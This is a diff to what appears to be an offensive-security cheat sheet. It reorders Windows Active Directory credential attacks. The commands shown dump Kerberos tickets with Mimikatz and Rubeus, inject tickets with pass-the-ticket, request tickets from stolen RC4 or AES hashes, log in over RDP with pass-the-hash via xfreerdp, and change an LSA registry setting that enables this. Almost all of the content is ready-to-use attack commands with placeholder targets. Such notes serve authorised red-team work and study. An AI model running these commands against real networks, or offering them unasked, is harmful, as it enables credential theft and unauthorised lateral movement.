@@ -679,18 +679,28 @@ C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRe
 $ xfreerdp  /v:<IP address> /u:<username> /pth:<hash>
 ```
 
-- Mimikatz Pass-The-Ticket (PTT)
+- Mimikatz Export Tickets
 
 ```
 C:\> mimikatz.exe privilege::debug "sekurlsa::tickets /export"
 C:\> dir *.kirb
+```
+
+- Rubeus Export Tickets
+
+```
+C:\> Rubeus.exe dump /nowrap
+```
+
+- Mimikatz Pass-The-Ticket (PTT)
+
+```
 mimikatz # kerberos::ptt "<ticket.kirbi>"
 ```
 
 - Rubeus Pass-The-Ticket (PTT)
 
 ```
-C:\> Rubeus.exe dump /nowrap
 C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /rc4:<hash> /ptt
 OR
 C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /aes256:<hash> /ptt
